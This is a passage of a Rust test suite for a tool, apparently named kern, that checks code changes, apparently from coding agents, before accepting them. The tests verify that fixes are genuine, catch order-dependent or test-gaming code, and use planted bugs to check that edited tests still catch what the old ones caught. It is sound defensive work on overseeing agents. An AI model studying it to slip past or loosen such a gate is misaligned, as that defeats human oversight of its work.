        (Runner::Jest, format!("{jest}\n{jest}"), "more than one"), (Runner::Jest, format!("{processed}{processed}"), "more than one"), (Runner::Node, tap.replace("1..5", ""), "incomplete"), (Runner::Node, format!("{tap}\n{tap}"), "more than one"),
        (Runner::Node, "not ok 1 - fake\n".into(), "no TAP report"),
    ] {
        let why_not = read_report(runner, out.as_bytes()).unwrap_err();
        assert!(why_not.contains(why), "{why}: {why_not}");
    }
}

fn tap(tests: &[(&str, &str)]) -> Vec<u8> {
    let mut out = String::from("TAP version 13\n");
    for (i, (name, status)) in tests.iter().enumerate() {
        let point = match *status { "passed" => format!("ok {} - {name}", i + 1), "failed" => format!("not ok {} - {name}", i + 1), _ => format!("ok {} - {name} # SKIP", i + 1) };
        out.push_str(&format!("# Subtest: {name}\n{point}\n  ---\n  duration_ms: 1\n  type: 'test'\n  ...\n"));
    }
    out.push_str(&format!("1..{}\n# tests {}\n", tests.len(), tests.len()));
    out.into_bytes()
}
fn no_edits(_: &kern::proof::Plan) -> R<Value> { panic!("no existing test changed, so no bugs are planted") }
fn runs(r: kern::proof::Run, base: &[(&str, &str)], new: &[(&str, &str)], old: &[(&str, &str)]) -> R<kern::proof::Output> {
    let tests = match r { kern::proof::Run::Base | kern::proof::Run::Kept => base, kern::proof::Run::New => new, kern::proof::Run::Old => old };
    Ok(kern::proof::Output { stdout: tap(tests), exit_code: i64::from(tests.iter().any(|t| t.1 == "failed")) })
}
#[test]
fn honest_fix_proof_compares_what_the_runner_says_ran() {
    use kern::proof::{Exec, Output, Run, prove};
    use std::sync::Mutex;
    use std::sync::atomic::{AtomicUsize, Ordering::SeqCst};
    let (base, candidate) = (honest_base(), honest_change(&[FIX, REGRESSION]));
    let prove_with = |kind: &str, candidate: &Files, run: &Exec| -> R<Value> {
        let policy = contract(&tested(kind)).unwrap();
        let changed = git::changes(&base, candidate, &policy)?;
        prove(policy.tests.as_ref().unwrap(), &base, candidate, &changed, run, &mut no_edits)
    };
    let (before, fixed, failing) = ([("adds", "passed")], [("adds", "passed"), ("adds 2 + 2", "passed")], [("adds", "passed"), ("adds 2 + 2", "failed")]);
    let calls = Mutex::new(Vec::new());
    let evidence = prove_with("bugfix", &candidate, &|r, files| { calls.lock().unwrap().push((r, files.to_vec())); runs(r, &before, &fixed, &failing) }).unwrap();
    let mut calls = calls.into_inner().unwrap();
    calls.sort();
    let focused = vec!["test/regression.test.mjs".to_string()];
    assert_eq!(calls, vec![(Run::Base, vec![]), (Run::New, vec![]), (Run::Kept, vec![]), (Run::Old, focused.clone()), (Run::Old, focused)],
        "the existing suite on the old code, everything on the new code, the old tests alone on the new code, while the old code runs only the new tests, twice: a failure that shows the bug has to repeat");
    assert_eq!(evidence["new_tests"], json!([{ "test": "adds 2 + 2", "old": "failed", "new": "passed" }]));
    assert_eq!((evidence["fail_to_pass"].as_u64(), evidence["pass_to_pass"].as_u64(), evidence["existing_test_files"].as_u64(), evidence["runner"].as_str()), (Some(1), Some(1), Some(2), Some("node")), "{evidence}");
    assert!(evidence["command"].as_array().unwrap().iter().any(|a| a == "--test-reporter=/kern/node-report.mjs"), "{evidence}");
    let refuse = |new: &[(&str, &str)], old: &[(&str, &str)], why: &str| denied(prove_with("bugfix", &candidate, &|r, _| runs(r, &before, new, old)), why);
    refuse(&fixed, &fixed, "None of the new tests fails on the old code");
    refuse(&[("adds 2 + 2", "passed")], &failing, "Tests did not run on the new code: \"adds\"");
    refuse(&[("adds", "skipped"), ("adds 2 + 2", "passed")], &failing, "Tests did not run on the new code: \"adds\"");
    refuse(&[("adds (renamed)", "passed"), ("adds 2 + 2", "passed")], &failing, "Tests did not run on the new code: \"adds\"");
    refuse(&[("adds", "passed"), ("adds 2 + 2", "skipped")], &failing, "Tests did not run on the new code: \"adds 2 + 2\"");
    refuse(&[("adds", "failed"), ("adds 2 + 2", "passed")], &failing, "The test suite fails on the new code: \"adds\"");
    refuse(&before, &failing, "No new test ran");
    denied(prove_with("bugfix", &candidate, &|r, _| if r == Run::Old { Ok(Output { stdout: b"Error: Cannot find module '../src/new.mjs'\n".to_vec(), exit_code: 1 }) } else { runs(r, &before, &fixed, &failing) }),
        "The test run on the old code with the new tests added gave no usable results");
    denied(prove_with("bugfix", &candidate, &|r, _| if r == Run::New { Ok(Output { stdout: tap(&fixed), exit_code: 1 }) } else { runs(r, &before, &fixed, &failing) }), "although no test failed");
    denied(prove_with("bugfix", &candidate, &|r, _| if r == Run::Old { Err(Denied("docker timed out after 35s".into())) } else { runs(r, &before, &fixed, &failing) }),
        "Kern could not run the test suite on the old code with the new tests added: docker timed out");
    denied(prove_with("bugfix", &candidate, &|r, _| if r == Run::Base { Ok(Output { stdout: Vec::new(), exit_code: 0 }) } else { runs(r, &before, &fixed, &failing) }), "Kern could not read the test results of the old code");
    denied(prove_with("bugfix", &candidate, &|r, _| runs(r, &[("adds", "failed")], &[("adds", "failed"), ("adds 2 + 2", "passed")], &failing)), "already fails before the change");
    prove_with("bugfix", &candidate, &|r, _| runs(r, &before, &[("adds", "passed"), ("adds", "passed")], &[("adds", "passed"), ("adds", "failed")])).unwrap();
    let news = AtomicUsize::new(0);
    let flaky = prove_with("bugfix", &candidate, &|r, _| if r == Run::New && news.fetch_add(1, SeqCst) == 0 { runs(r, &before, &[("adds", "failed"), ("adds 2 + 2", "passed")], &failing) } else { runs(r, &before, &fixed, &failing) }).unwrap();
    assert_eq!((flaky["flaky"].clone(), news.load(SeqCst)), (json!(["adds"]), 2), "{flaky}");
    let crashed = AtomicUsize::new(0);
    prove_with("bugfix", &candidate, &|r, _| if r == Run::New && crashed.fetch_add(1, SeqCst) == 0 { Ok(Output { stdout: b"Segmentation fault\n".to_vec(), exit_code: 139 }) } else { runs(r, &before, &fixed, &failing) }).unwrap();
    let olds = AtomicUsize::new(0);
    denied(prove_with("bugfix", &candidate, &|r, _| if r == Run::Old && olds.fetch_add(1, SeqCst) > 0 { runs(r, &before, &fixed, &fixed) } else { runs(r, &before, &fixed, &failing) }),
        "The new tests fail on the old code only sometimes: \"adds 2 + 2\"");
    let calls = Mutex::new(Vec::new());
    prove_with("bugfix", &candidate, &|r, files| {
        calls.lock().unwrap().push((r, files.len()));
        if r == Run::Old && !files.is_empty() { Ok(Output { stdout: tap(&[]), exit_code: 0 }) } else { runs(r, &before, &fixed, &failing) }
    }).unwrap();
    let calls = calls.into_inner().unwrap();
    assert_eq!(calls.iter().filter(|c| **c == (Run::Old, 0)).count(), 2, "the whole suite on the old code, twice: {calls:?}");
    let seen = Mutex::new(Vec::new());
    prove_with("feature", &candidate, &|r, _| { seen.lock().unwrap().push(r); runs(r, &before, &fixed, &fixed) }).unwrap();
    let mut seen = seen.into_inner().unwrap();
    seen.sort();
    assert_eq!(seen, vec![Run::Base, Run::New, Run::Kept]);
    let seen = Mutex::new(Vec::new());
    prove_with("refactor", &honest_change(&[FIX]), &|r, _| { seen.lock().unwrap().push(r); runs(r, &before, &before, &[]) }).unwrap();
    let mut seen = seen.into_inner().unwrap();
    seen.sort();
    assert_eq!(seen, vec![Run::Base, Run::New]);
    denied(prove_with("refactor", &honest_change(&[FIX]), &|r, _| runs(r, &before, &[], &[])), "Tests did not run on the new code");
}

#[test]
fn code_that_only_behaves_when_the_new_tests_run_first_is_caught() {
    use kern::proof::{Exec, Output, Run, prove};
    let (base, candidate) = (honest_base(), honest_change(&[FIX, REGRESSION]));
    let policy = contract(&tested("bugfix")).unwrap();
    let changed = git::changes(&base, &candidate, &policy).unwrap();
    let prove_with = |run: &Exec| prove(policy.tests.as_ref().unwrap(), &base, &candidate, &changed, run, &mut no_edits);
    let (before, fixed, failing) = ([("adds", "passed")], [("adds", "passed"), ("adds 2 + 2", "passed")], [("adds", "passed"), ("adds 2 + 2", "failed")]);
    let alone = |kept: &'static [(&'static str, &'static str)]| move |r: Run, _: &[String]| -> R<Output> {
        let tests: &[(&str, &str)] = match r { Run::Base => &before, Run::New => &fixed, Run::Old => &failing, Run::Kept => kept };
        Ok(Output { stdout: tap(tests), exit_code: i64::from(tests.iter().any(|t| t.1 == "failed")) })
    };
    denied(prove_with(&alone(&[("adds", "failed")])), "Existing tests fail on the new code when they run without the new tests: \"adds\"");
    denied(prove_with(&alone(&[])), "Tests did not run on the new code: \"adds\"");
    let evidence = prove_with(&alone(&[("adds", "passed")])).unwrap();
    assert_eq!(evidence["old_tests_alone"]["passed"], 1, "{evidence}");
    let seen = std::sync::Mutex::new(Vec::new());
    let refactor = contract(&tested("refactor")).unwrap();
    let plain = honest_change(&[FIX]);
    prove(refactor.tests.as_ref().unwrap(), &base, &plain, &git::changes(&base, &plain, &refactor).unwrap(), &|r, _| { seen.lock().unwrap().push(r); runs(r, &before, &before, &[]) }, &mut no_edits).unwrap();
    assert!(!seen.into_inner().unwrap().contains(&Run::Kept));
}

#[test]
fn tests_that_already_fail_before_the_change_are_set_aside_but_must_keep_running() {
    use kern::proof::{Exec, Output, Run, prove};
    use std::sync::Mutex;
    let (base, candidate) = (honest_base(), honest_change(&[FIX, REGRESSION]));
    let prove_with = |kind: &str, candidate: &Files, run: &Exec| -> R<Value> {
        let policy = contract(&tested(kind)).unwrap();
        let changed = git::changes(&base, candidate, &policy)?;
        prove(policy.tests.as_ref().unwrap(), &base, candidate, &changed, run, &mut no_edits)
    };
    let before = [("adds", "passed"), ("needs internet", "failed")];
    let fixed = [("adds", "passed"), ("needs internet", "failed"), ("adds 2 + 2", "passed")];
    let failing = [("adds", "passed"), ("needs internet", "failed"), ("adds 2 + 2", "failed")];
    let calls = Mutex::new(Vec::new());
    let evidence = prove_with("bugfix", &candidate, &|r, files| { calls.lock().unwrap().push((r, files.len())); runs(r, &before, &fixed, &failing) }).unwrap();
    assert_eq!(evidence["already_failing"], json!({ "total": 1, "tests": ["needs internet"], "passing_now": 0 }), "{evidence}");
    assert_eq!((evidence["pass_to_pass"].as_u64(), evidence["fail_to_pass"].as_u64()), (Some(1), Some(1)), "{evidence}");
    let mut calls = calls.into_inner().unwrap();
    calls.sort();
    assert_eq!(calls, vec![(Run::Base, 0), (Run::New, 0), (Run::Kept, 0), (Run::Old, 1), (Run::Old, 1)], "a known failure is not a reason to run the new code again");
    let healed = prove_with("bugfix", &candidate, &|r, _| runs(r, &before, &[("adds", "passed"), ("needs internet", "passed"), ("adds 2 + 2", "passed")], &failing)).unwrap();
    assert_eq!(healed["already_failing"]["passing_now"], 1, "{healed}");
    let refuse = |new: &[(&str, &str)], why: &str| denied(prove_with("bugfix", &candidate, &|r, _| runs(r, &before, new, &failing)), why);
    refuse(&[("adds", "passed"), ("adds 2 + 2", "passed")], "Tests did not run on the new code: \"needs internet\"");
    refuse(&[("adds", "passed"), ("needs internet", "skipped"), ("adds 2 + 2", "passed")], "Tests did not run on the new code: \"needs internet\"");
    refuse(&[("adds", "failed"), ("needs internet", "failed"), ("adds 2 + 2", "passed")], "The test suite fails on the new code: \"adds\"");
    refuse(&[("adds", "passed"), ("needs internet", "failed"), ("adds 2 + 2", "failed")], "The test suite fails on the new code: \"adds 2 + 2\"");
    denied(prove_with("bugfix", &candidate, &|r, _| if r == Run::New { Ok(Output { stdout: tap(&[("adds", "passed"), ("adds 2 + 2", "passed")]), exit_code: 1 }) } else { runs(r, &before, &fixed, &failing) }), "");
    denied(prove_with("bugfix", &candidate, &|r, _| runs(r, &[("adds", "failed")], &[("adds", "failed"), ("adds 2 + 2", "passed")], &failing)), "already fails before the change");
    let rewritten = honest_change(&[FIX, ("test/add.test.mjs", Some("import { test } from 'node:test';\nimport assert from 'node:assert';\nimport { add } from '../src/add.mjs';\ntest('adds', () => assert.equal(add(2, 3), 5));\n"))]);
    let policy = contract(&tested("feature")).unwrap();
    let changed = git::changes(&base, &rewritten, &policy).unwrap();
    let kept = |_: Run, _: &[String]| -> R<Output> { Ok(Output { stdout: tap(&before), exit_code: 1 }) };
    let mut planted = None;
    let evidence = prove(policy.tests.as_ref().unwrap(), &base, &rewritten, &changed, &kept, &mut |plan| {
        planted = Some(plan.json(60));
        Ok(json!({ "version": 1, "baseline": { "old": true, "new": true }, "milliseconds": { "old": 1, "new": 1, "total": 2 }, "mutants": plan.mutants.iter().map(|m| json!({ "id": m.id, "result": "caught" })).collect::<Vec<_>>() }))
    }).unwrap();
    let plan = planted.expect("bugs are planted");
    assert_eq!((plan["known"].clone(), plan["runner"].as_str()), (json!(["needs internet"]), Some("node")), "{plan}");
    assert!(plan["command"].as_array().unwrap().iter().any(|a| a == "--test-reporter=/kern/node-report.mjs"), "the planting runs print the report they are judged by: {plan}");
    assert!(evidence["test_edits"]["safety_net"]["checked"].as_u64() > Some(0), "{evidence}");
    use kern::proof::caught;
    let known = BTreeSet::from(["needs internet".to_string()]);
    assert!(!caught(policy::Runner::Node, &known, &tap(&before), false), "the known failure alone catches nothing");
    assert!(caught(policy::Runner::Node, &known, &tap(&[("adds", "failed"), ("needs internet", "failed")]), false));
    assert!(caught(policy::Runner::Node, &known, b"Segmentation fault\n", false));
    assert!(!caught(policy::Runner::Node, &BTreeSet::new(), &tap(&[("adds", "passed")]), true));
    assert!(caught(policy::Runner::Node, &BTreeSet::new(), b"", false), "without known failures a failed run is a caught bug, as before");
}

#[test]
fn planted_bugs_are_small_edits_in_the_code_the_old_tests_reach() {
    let source = "import { log } from './log.mjs';\nexport const add = (a, b) => {\n  if (a > 0 && b > 0) {\n    log(a);\n  }\n  console.log('adding', a > b);\n  return a + b;\n};\n";
    let base = files(&[("src/add.mjs", source), ("src/log.mjs", "export const log = (x) => console.log('adding', x);\n"), ("src/unused.mjs", "export const twice = (a) => a * 2;\n"),
        ("src/index.ts", "export { twice } from './unused.js';\n"), ("test/helpers/load.mjs", "export { add } from '../../src/add.mjs';\n"),
        ("test/add.test.mjs", "import { test } from 'node:test';\nimport assert from 'node:assert';\nimport { add } from './helpers/load.mjs';\ntest('adds', () => assert.equal(add(1, 2), 3));\n"), ("README.md", "x\n"),
        ("test/twice.test.mjs", "import { test } from 'node:test';\nimport { twice } from '../src/unused.mjs';\ntest('twice', () => twice(1));\n"), ("test/plain.test.mjs", "import { test } from 'node:test';\ntest('plain', () => {});\n")]);
    let mut candidate = base.clone();
    candidate.insert("test/add.test.mjs".into(), file("import { test } from 'node:test';\nimport assert from 'node:assert';\nimport { add } from '../src/add.mjs';\ntest('adds two numbers', () => assert.equal(add(1, 2), 3));\n"));
    let policy = contract(&tested("refactor")).unwrap();
    let changed = git::changes(&base, &candidate, &policy).unwrap();
    let plan = kern::proof::plan(policy.tests.as_ref().unwrap(), &base, &candidate, &changed["tests"]).unwrap();
    assert_eq!(plan.targets, ["src/add.mjs", "src/log.mjs"]);
    assert_eq!(plan.old_files, ["test/add.test.mjs"]);
    assert!(!plan.mutants.is_empty() && plan.mutants.iter().all(|m| m.tests == ["test/add.test.mjs"]), "{:?}", plan.mutants);
    for (runner, command, last) in [("jest", json!(["/workspace/node_modules/.bin/jest"]), "--ci"), ("vitest", json!(["/workspace/node_modules/.bin/vitest", "run"]), "--no-cache"), ("node", json!(["/usr/local/bin/node", "--test"]), "--test")] {
        let mut v = tested("refactor");
        (v["tests"]["runner"], v["tests"]["command"]) = (json!(runner), command);
        let other = contract(&v).unwrap();
        assert_eq!(kern::proof::plan(other.tests.as_ref().unwrap(), &base, &candidate, &changed["tests"]).unwrap().command.last().map(String::as_str), Some(last), "{runner}");
    }
    let mut helped = candidate.clone();
    helped.insert("test/helpers/load.mjs".into(), file("export { add } from '../../src/add.mjs';
export const unused = 1;
"));
    let changed_helper = git::changes(&base, &helped, &policy).unwrap();
    assert!(kern::proof::plan(policy.tests.as_ref().unwrap(), &base, &helped, &changed_helper["tests"]).unwrap().old_files.is_empty());
    let planted: Vec<String> = plan.mutants.iter().map(|m| m.describe()).collect();
    assert_eq!(planted, ["src/add.mjs:3 changes > to >=", "src/add.mjs:4 removes a call", "src/add.mjs:7 changes + to -"], "{planted:?}");
    for m in &plan.mutants {
        assert_eq!(&source[m.start..m.end], m.original, "{m:?}");
        let mutated = format!("{}{}{}", &source[..m.start], m.replacement, &source[m.end..]);
        kern::capability::footprint("src/add.mjs", &mutated).expect("every planted bug still parses");
    }
    assert_eq!(plan.mutants, kern::proof::plan(policy.tests.as_ref().unwrap(), &base, &candidate, &changed["tests"]).unwrap().mutants, "the same change plants the same bugs");
    let long: String = (1..=60).map(|i| format!("export const f{i} = (a) => a + {i};\n")).collect();
    let mut wide = base.clone();
    wide.insert("src/add.mjs".into(), file(&long));
    let mut wide_candidate = candidate.clone();
    wide_candidate.insert("src/add.mjs".into(), file(&long));
    wide_candidate.insert("test/add.test.mjs".into(), file("import { test } from 'node:test';\nimport { f1 } from '../src/add.mjs';\ntest('f1', () => f1(1));\n"));
    let changed = git::changes(&wide, &wide_candidate, &policy).unwrap();
    let lines: Vec<usize> = kern::proof::plan(policy.tests.as_ref().unwrap(), &wide, &wide_candidate, &changed["tests"]).unwrap().mutants.iter().map(|m| m.line).collect();
    assert_eq!(lines.len(), 40);
    assert!(lines[0] == 1 && lines[39] >= 59 && lines.windows(2).all(|w| w[0] < w[1]), "{lines:?}");
    candidate.insert("test/add.test.mjs".into(), file("import { test } from 'node:test';\ntest('nothing', () => {});\n"));
    let mut lone = base.clone();
    lone.insert("test/add.test.mjs".into(), file("import { test } from 'node:test';\ntest('nothing at all', () => {});\n"));
    let changed = git::changes(&lone, &candidate, &policy).unwrap();
    assert_eq!(kern::proof::plan(policy.tests.as_ref().unwrap(), &lone, &candidate, &changed["tests"]).unwrap().targets, ["src/add.mjs", "src/index.ts", "src/log.mjs", "src/unused.mjs"]);
}

#[test]
fn planted_bugs_spread_over_parallel_sandboxes_and_come_back_in_order() {
    use kern::proof::{merge_planted, split_planting};
    let long: String = (1..=60).map(|i| format!("export const f{i} = (a) => a + {i};\n")).collect();
    let base = files(&[("src/add.mjs", &long), ("test/add.test.mjs", "import { test } from 'node:test';\nimport { f1 } from '../src/add.mjs';\ntest('f1', () => f1(1));\n")]);
    let mut candidate = base.clone();
    candidate.insert("test/add.test.mjs".into(), file("import { test } from 'node:test';\nimport { f1 } from '../src/add.mjs';\ntest('f1 again', () => f1(1));\n"));
    let policy = contract(&tested("refactor")).unwrap();
    let changed = git::changes(&base, &candidate, &policy).unwrap();
    let plan = kern::proof::plan(policy.tests.as_ref().unwrap(), &base, &candidate, &changed["tests"]).unwrap();
    assert_eq!(plan.mutants.len(), 40);
    let parts = split_planting(&plan, 3);
    assert_eq!(parts.iter().map(|p| p.mutants.len()).collect::<Vec<_>>(), [14, 13, 13]);
    let mut ids: Vec<usize> = parts.iter().flat_map(|p| p.mutants.iter().map(|m| m.id)).collect();
    ids.sort();
    assert!(ids == (1..=40).collect::<Vec<_>>() && parts.iter().all(|p| p.command == plan.command && p.old_files == plan.old_files && p.known == plan.known));
    assert_eq!(split_planting(&plan, 64).len(), 10);
    assert_eq!(split_planting(&plan, 1).len(), 1);
    let answer = |p: &kern::proof::Plan, ok: bool, ms: u64| json!({ "version": 1, "baseline": { "old": ok, "new": true, "old_error": if ok { "" } else { "boom" }, "new_error": "" },
        "milliseconds": { "old": ms, "new": ms, "total": ms * 10 }, "mutants": p.mutants.iter().rev().map(|m| json!({ "id": m.id, "result": "caught" })).collect::<Vec<_>>() });
    let merged = merge_planted(parts.iter().enumerate().map(|(i, p)| answer(p, true, 100 + i as u64)).collect()).unwrap();
    assert_eq!((merged["version"].as_u64(), merged["baseline"]["old"].as_bool(), merged["milliseconds"]["total"].as_u64()), (Some(1), Some(true), Some(1020)));
    assert_eq!(merged["mutants"].as_array().unwrap().iter().map(|m| m["id"].as_u64().unwrap() as usize).collect::<Vec<_>>(), (1..=40).collect::<Vec<_>>());
    let failed = merge_planted(parts.iter().enumerate().map(|(i, p)| answer(p, i != 1, 100)).collect()).unwrap();
    assert_eq!((failed["baseline"]["old"].as_bool(), failed["baseline"]["old_error"].as_str()), (Some(false), Some("boom")));
}

#[test]
fn a_planted_bug_counts_as_lost_only_when_both_runs_agree_twice() {
    use kern::proof::{Suite, decide};
    let decided = |focused: bool, answers: &[Option<bool>]| {
        let mut calls = Vec::new();
        let mut at = 0;
        let result = decide(&mut |suite| { calls.push(suite); at += 1; Ok(answers[at - 1]) }, focused).unwrap();
        (result, calls)
    };
    use Suite::{NewFocused, NewFull, Old};
    assert_eq!(decided(false, &[Some(false)]), ("missed by old", vec![Old]), "the old tests never caught it, so the new tests owe nothing");
    assert_eq!(decided(false, &[Some(true), Some(true)]), ("caught", vec![Old, NewFull]));
    assert_eq!(decided(false, &[Some(true), Some(false), Some(true), Some(false)]), ("lost", vec![Old, NewFull, Old, NewFull]));
    assert_eq!(decided(false, &[Some(true), Some(false), Some(false)]).0, "flaky", "the old tests caught it only once");
    assert_eq!(decided(false, &[Some(true), Some(false), Some(true), Some(true)]).0, "flaky", "the new tests missed it only once");
    assert_eq!(decided(false, &[None]).0, "not run");
    assert_eq!(decided(false, &[Some(true), Some(false), None]).0, "not run");
    assert_eq!(decided(true, &[Some(true), Some(true)]), ("caught", vec![Old, NewFocused]));
    assert_eq!(decided(true, &[Some(true), Some(false), Some(true)]), ("caught", vec![Old, NewFocused, NewFull]));
    assert_eq!(decided(true, &[Some(true), Some(false), Some(false), Some(true), Some(false)]), ("lost", vec![Old, NewFocused, NewFull, Old, NewFull]));
    use kern::proof::run_limit;
    let s = std::time::Duration::from_secs;
    assert_eq!(run_limit(s(100), None), Some(s(100)), "a baseline gets the whole remaining budget");
    assert_eq!(run_limit(s(0), None), None, "nothing runs once the budget is gone");
    assert_eq!(run_limit(s(10), Some(s(5))), Some(s(5)));
    assert_eq!(run_limit(s(4), Some(s(5))), None, "a planted run that cannot finish in time is not started");
}

fn edited_change() -> Files { honest_change(&[FIX, ("test/add.test.mjs", Some(&ADD_TEST.replace("test('adds'", "test('adds two numbers'")))]) }
fn mutated(results: &[&str]) -> Value {
    json!({ "version": 1, "baseline": { "old": true, "new": true }, "milliseconds": { "old": 400, "new": 500, "total": 2100 }, "seconds": { "old": 0.4, "new": 0.5 },
        "mutants": results.iter().enumerate().map(|(i, r)| json!({ "id": i + 1, "result": r })).collect::<Vec<_>>() })
}
#[test]
fn rewritten_tests_must_keep_the_old_behaviour_and_the_safety_net() {
    use kern::proof::{Exec, Output, Plan, Run, prove};
    use std::sync::Mutex;
    let base = honest_base();
    let prove_with = |kind: &str, candidate: &Files, run: &Exec, mutate: &mut dyn FnMut(&Plan) -> R<Value>| -> R<Value> {
        let policy = contract(&tested(kind)).unwrap();
        let changed = git::changes(&base, candidate, &policy)?;
        prove(policy.tests.as_ref().unwrap(), &base, candidate, &changed, run, mutate)
    };
    let renamed = [("adds two numbers", "passed")];
    let honest = |r: Run| runs(r, &[("adds", "passed")], &renamed, &[]);
    let kept = |r: Run, old: &[(&str, &str)]| if r == Run::Kept { Ok(Output { stdout: tap(old), exit_code: 0 }) } else { honest(r) };
    let (calls, mut plans) = (Mutex::new(Vec::new()), Vec::new());
    let evidence = prove_with("refactor", &edited_change(), &|r, _| { calls.lock().unwrap().push(r); kept(r, &[("adds", "passed")]) }, &mut |p| { plans.push(p.mutants.len()); Ok(mutated(&["caught"])) }).unwrap();
    let mut calls = calls.into_inner().unwrap();
    calls.sort();
    assert_eq!(calls, vec![Run::Base, Run::New, Run::Kept], "the old tests run on the new code as well");
    assert_eq!(plans, vec![1], "one planted bug: the + in src/add.mjs");
    let net = &evidence["test_edits"]["safety_net"];
    assert_eq!((net["planted"].as_u64(), net["checked"].as_u64(), net["still_caught"].as_u64(), net["lost"].clone()), (Some(1), Some(1), Some(1), json!([])), "{evidence}");
    assert_eq!(evidence["test_edits"]["changed_files"], json!(["test/add.test.mjs"]));
    canonical(&evidence).expect("the evidence can be signed");
    assert_eq!((net["milliseconds"]["old"].as_u64(), net["milliseconds"]["new"].as_u64(), net.get("seconds")), (Some(400), Some(500), None), "{net}");
    denied(prove_with("refactor", &edited_change(), &|r, _| kept(r, &[("adds", "passed")]), &mut |_| Ok(mutated(&["lost"]))),
        "Your test changes stop catching bugs the old tests caught: \"src/add.mjs:1 changes + to -\"");
    let flaky = prove_with("refactor", &edited_change(), &|r, _| kept(r, &[("adds", "passed")]), &mut |_| Ok(mutated(&["flaky"]))).unwrap();
    assert_eq!(flaky["test_edits"]["safety_net"]["flaky"], json!(["src/add.mjs:1 changes + to -"]));
    denied(prove_with("refactor", &edited_change(), &|r, _| kept(r, &[("adds", "failed")]), &mut |_| Ok(mutated(&["caught"]))), "Existing tests fail on the new code: \"adds\"");
    denied(prove_with("bugfix", &edited_change(), &|r, _| if r == Run::Kept { Ok(Output { stdout: b"Error: Cannot find module '../src/add.mjs'\n".to_vec(), exit_code: 1 }) } else { honest(r) }, &mut |_| Ok(mutated(&["caught"]))),
        "The old tests gave no usable results on the new code");
    let changed = prove_with("change", &edited_change(), &|r, _| kept(r, &[("adds", "failed")]), &mut |_| Ok(mutated(&["caught"]))).unwrap();
    assert_eq!(changed["test_edits"]["changed_expectations"], json!(["adds"]), "{changed}");
    denied(prove_with("refactor", &edited_change(), &|r, _| kept(r, &[("adds", "passed")]), &mut |_| Ok(mutated(&["not run"]))), "could not check the test changes in time");
    let mut broken = mutated(&["caught"]);
    broken["baseline"]["old"] = json!(false);
    denied(prove_with("refactor", &edited_change(), &|r, _| kept(r, &[("adds", "passed")]), &mut |_| Ok(broken.clone())), "Kern could not check the test changes");
    denied(prove_with("refactor", &edited_change(), &|r, _| kept(r, &[("adds", "passed")]), &mut |_| Ok(mutated(&["caught", "caught"]))), "Kern could not check the test changes");
    let calls = Mutex::new(Vec::new());
    prove_with("refactor", &honest_change(&[FIX]), &|r, _| { calls.lock().unwrap().push(r); runs(r, &[("adds", "passed")], &[("adds", "passed")], &[]) }, &mut |_| panic!("no planted bugs without test edits")).unwrap();
    let mut calls = calls.into_inner().unwrap();
    calls.sort();
    assert_eq!(calls, vec![Run::Base, Run::New]);
    let calls = Mutex::new(Vec::new());
    let tests_only = honest_change(&[("test/add.test.mjs", Some(&ADD_TEST.replace("test('adds'", "test('adds two numbers'")))]);
    let only = prove_with("refactor", &tests_only, &|r, _| { calls.lock().unwrap().push(r); runs(r, &[("adds", "passed")], &renamed, &[]) }, &mut |_| Ok(mutated(&["caught"]))).unwrap();
    let mut calls = calls.into_inner().unwrap();
    calls.sort();
    assert_eq!(calls, vec![Run::Base, Run::New], "{only}");
    assert_eq!(only["test_edits"]["old_tests_on_new_code"]["passed"], 1, "{only}");
}

fn reason<T: std::fmt::Debug>(r: R<T>) -> String { r.expect_err("expected a block").0 }
#[test]
fn every_block_becomes_feedback_an_agent_can_act_on() {
    use kern::feedback::explain;
    let policy = contract(&policy_value()).unwrap();
    let base = files(&[("src/add.mjs", "export const add = (a, b) => a - b;\n"), ("README.md", "x\n")]);
    let with = |changes: &[(&str, &str)]| { let mut c = base.clone(); for (p, t) in changes { c.insert(p.to_string(), file(t)); } c };
    let check = |reason: String, rule: &str, fixable: bool, path: Option<&str>, words: &[&str]| {
        let f = explain(&reason, Some(&policy));
        assert_eq!((f["schema"].as_str(), f["status"].as_str(), f["reason"].as_str()), (Some("kern-feedback/v1"), Some("BLOCKED"), Some(reason.as_str())), "{f}");
        assert_eq!(f["agent_fixable"], fixable, "{reason}: {f}");
        let v = &f["violations"][0];
        assert_eq!(v["rule"], rule, "{reason}: {f}");
        if let Some(p) = path { assert_eq!(v["path"], p, "{reason}: {f}"); }
        let instruction = v["instruction"].as_str().unwrap();
        for w in words { assert!(instruction.contains(w), "{reason}: instruction {instruction:?} lacks {w:?}"); }
        assert!(!instruction.contains("operator.json") && !instruction.contains("task contract"), "agents are told how to fix code, never how to loosen the gate: {instruction}");
        f
    };
    check(reason(git::changes(&base, &with(&[("README.md", "y\n")]), &policy)), "scope", true, Some("README.md"), &["`README.md`", "`src/`"]);
    check(reason(git::changes(&base, &with(&[("src/.env", "K=v\n")]), &policy)), "protected-path", true, Some("src/.env"), &["`src/.env`"]);
    let nine: Vec<(String, String)> = (0..9).map(|i| (format!("src/f{i}.mjs"), "export const x = 1;\n".to_string())).collect();
    let nine: Vec<(&str, &str)> = nine.iter().map(|(p, t)| (p.as_str(), t.as_str())).collect();
    check(reason(git::changes(&base, &with(&nine), &policy)), "budget", true, None, &["8 files", "200"]);
    {
        use kern::proof::{Output, Run, prove};
        let (hb, hc) = (honest_base(), honest_change(&[FIX, REGRESSION]));
        let bugfix = contract(&tested("bugfix")).unwrap();
        let changed = git::changes(&hb, &hc, &bugfix).unwrap();
        let tap_of = |t: &[(&str, &str)]| Ok(Output { stdout: tap(t), exit_code: i64::from(t.iter().any(|x| x.1 == "failed")) });
        let order = |r: Run, _: &[String]| match r { Run::Kept => tap_of(&[("adds", "failed")]), Run::Base => tap_of(&[("adds", "passed")]), Run::New => tap_of(&[("adds", "passed"), ("adds 2 + 2", "passed")]), Run::Old => tap_of(&[("adds", "passed"), ("adds 2 + 2", "failed")]) };
        check(reason(prove(bugfix.tests.as_ref().unwrap(), &hb, &hc, &changed, &order, &mut no_edits)), "order-dependent", true, None, &["`\"adds\"`", "state"]);
        let broken = |_: Run, _: &[String]| tap_of(&[("adds", "failed")]);
        check(reason(prove(bugfix.tests.as_ref().unwrap(), &hb, &hc, &changed, &broken, &mut no_edits)), "tests-failing", false, None, &["base branch"]);
    }
    check(reason(git::changes(&base, &with(&[("src/blob.bin", "a\0b")]), &policy)), "unsupported-change", true, Some("src/blob.bin"), &["`src/blob.bin`"]);
    let grown = with(&[("src/add.mjs", "import { exec } from 'node:child_process';\nexport const add = (a, b) => a + b;\n"), ("src/net.mjs", "export const get = () => fetch('https://x');\n")]);
    let changed = git::changes(&base, &grown, &policy).unwrap();
